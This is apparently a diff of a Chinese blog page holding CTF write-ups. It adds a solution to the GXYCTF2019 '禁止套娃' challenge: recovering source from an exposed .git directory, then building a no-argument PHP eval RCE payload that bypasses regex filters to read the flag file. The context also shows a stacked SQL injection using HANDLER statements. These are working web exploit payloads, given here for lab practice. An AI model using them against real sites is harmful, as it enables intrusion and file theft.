@@ -470,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    240
+                    558
                 </div>
                 
 
@@ -546,6 +546,51 @@
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span> <span class="token keyword">handler</span> FlagHere <span class="token keyword">open</span><span class="token punctuation">;</span> <span class="token keyword">handler</span> FlagHere <span class="token keyword">read</span> <span class="token keyword">first</span><span class="token punctuation">;</span> <span class="token keyword">handler</span> FlagHere <span class="token keyword">close</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr442tutlfj60kh086aak02.jpg" alt="image-20210602184459675"></p>
+<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><ol>
+<li>手测可以知道<code>.git</code>目录进制访问，说明存在<code>.git</code>目录</li>
+<li>利用GitHack，恢复git目录下的文件</li>
+</ol>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt7xc2wqrzj30fm02n0sw.jpg" alt="image-20210807083431637"></p>
+<p>进入生成的目录中，打开idndex.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token comment">// echo $_GET['exp'];</span>
+                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>第一个正则不让进行伪协议读取</li>
+<li>第二个正则只允许exp中有<code>a-z_;</code></li>
+<li>第三个正则不允许出现上面字母搭配的情况</li>
+</ul>
+<p>利用无参数RCE构造:</p>
+<pre class="line-numbers language-none"><code class="language-none">exp&#x3D;print_r(scandir(&#39;.&#39;))
+&#x3D;&#x3D;&gt; .是非法字符需要转换
+localeconv()：是一个编程语言函数，返回包含本地数字及货币信息格式的数组。其中数组中的第一个为点号(.)
+pos()：返回数组中的当前元素的值。这里也可以换成current()，作用和pos类似
+&#x3D;&#x3D;&gt;
+exp&#x3D;print_r(scandir(pos(localeconv())));
+&#x3D;&#x3D;&gt;可以看到flag是倒数第二个文件
+exp&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));
+&#x3D;&#x3D;&gt;读取到flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt7y7wydi5j30pa0e60td.jpg" alt="image-20210807090512039"></p>
 
                 
             </div>
